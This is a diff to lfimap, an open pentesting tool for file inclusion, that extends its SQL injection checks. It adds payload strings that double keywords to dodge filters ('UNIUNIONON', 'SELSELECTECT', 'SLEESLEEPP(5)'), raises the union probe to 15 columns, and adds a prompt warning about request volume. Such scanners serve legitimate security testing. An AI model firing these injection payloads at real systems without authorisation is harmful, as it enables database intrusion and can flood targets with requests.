@@ -30,6 +30,7 @@ rfi_test_port = 8000
 scriptName = ""
 tempArg = ""
 webDir = ""
+skipsqli = False
 stats = {}
 stats["headRequests"] = 0
 stats["getRequests"] = 0
@@ -658,22 +659,35 @@ def test_heuristics(url):
     return
 
 def test_sqli(url):
-
+    global skipsqli
+    if(skipsqli): return
     if(args.verbose):
-        print("[i] Testing with union-based SQL injection up to 5 columns...")
+        print("[i] Testing with union-based SQL injection up to 15 columns...")
     
     pyldList = []
     pyldList.append("1337 UNION ALL SELECT INJECT")
     pyldList.append("1337\" UNION ALL SELECT INJECT-- -")
     pyldList.append("1337' UNION ALL SELECT INJECT-- -")
-    pyldList.append("1337' UNION ALL SELECT INJECT#")
+    pyldList.append("1337' UNION ALL SELECT INJECT%23")
     pyldList.append("1337)' UNION ALL SELECT INJECT-- -")
     pyldList.append("1337)\" UNION ALL SELECT INJECT-- -")
-
+    pyldList.append("1337 UNIUNIONON ALL SELSELECTECT INJECT--%23 -%23")
+    pyldList.append("1337' UNIUNIONON ALL SELSELECTECT INJECT--%23 -%23")
+    pyldList.append("1337)\" UNIUNIONON ALL SELSELECTECT INJECT%23-- -%23")
+    pyldList.append("1337)' UNIUNIONON ALL SELSELECTECT INJECT%23-- -%23")
+    pyldList.append("1337 UNIUNIONON ALL SELECT INJECT%23-- -%23")
+    pyldList.append("1337' UNIUNIONON ALL SELECT INJECT%23-- -%23")
+    pyldList.append("1337\" UNIUNIONON ALL SELECT INJECT%23-- -%23")
+    pyldList.append("1337)\" UNIUNIONON ALL SELECT INJECT%23-- -%23")
+    pyldList.append("1337 UNION ALL SELSELECTECT INJECT%23-- -%23")
+    pyldList.append("1337' UNION ALL SELSELECTECT INJECT%23-- -%23")
+    pyldList.append("1337\" UNION ALL SELSELECTECT INJECT%23-- -%23")
+    pyldList.append("1337)\" UNION ALL SELSELECTECT INJECT%23-- -%23")
+    
     toInject = 'concat(0x6c66696d61702d696e6a65637465642d737472696e67)'
     for p in pyldList:
-        # Test up to 5 columns, this will generate at most 45 requests for union-based sqli test.
-        for i in range(5):
+        # Test up to 15 columns, this will generate a lot of requests. Careful not to flood the target with --sqli/-a options!!!
+        for i in range(15):
             if(i == 0): 
                 pyld = p.replace("INJECT", toInject)
                 ltrInject = ',' + toInject
@@ -732,11 +746,15 @@ def test_sqli(url):
     sqli.append("SLEEP(5)--")
     sqli.append("SLEEP(5)=\"")
     sqli.append("SLEEP(5)='")
-    sqli.append("or SLEEP(5)")
-    sqli.append("or SLEEP(5)#")
-    sqli.append("or SLEEP(5)--")
-    sqli.append("or SLEEP(5)=\"")
-    sqli.append("or SLEEP(5)='")
+    sqli.append("1 or SLEEP(5)")
+    sqli.append("1 or SLEEP(5)#")
+    sqli.append("1 or SLEEP(5)--")
+    sqli.append("1 or SLEEP(5)=\"")
+    sqli.append("1 or SLEEP(5)='")
+    sqli.append("1 or SLEESLEEPP(5)%23-- -'")
+    sqli.append("1 or SLEESLEEPP(5)='")
+    sqli.append("1' or SLEESLEEPP(5)%23-- -'")
+    sqli.append("\"or SLEESLEEPP(5)%23-- -'")
 
     timeSum = 0
     # GET baseline response time
@@ -1340,7 +1358,7 @@ def main():
 
     proxies['http'] = args.proxyAddr
     proxies['https'] = args.proxyAddr
-    
+
     # If multiple URLS are specified from a file.
     if(args.f):
         c = 0
@@ -1571,6 +1589,7 @@ def main():
 
 if(__name__ == "__main__"):
     
+    
     print("")
     parser = argparse.ArgumentParser(description="lfimap, Local File Inclusion discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)
     
@@ -1724,7 +1743,16 @@ if(__name__ == "__main__"):
             if(args.lport < 1 or args.lport > 65534):
                 print("[-] LPORT must be between 1 and 65534. Exiting ...")
                 sys.exit(-1)
-    
+
+    if(args.test_all or args.sqli):
+        #Warn user for sqli testing
+        print("[!] WARNING. SQL injection test could easily generate hundreds of request per endpoint!")
+        option = input("[?] Are you sure you want to continue? y/n: ")
+        print()
+        if(not (option == "y" or option == "Y")): 
+            print("[i] Lfimap will skip sqli testing...")
+            skipsqli = True
+
     #Check if proxy is correct
     if(args.proxyAddr):
         try:
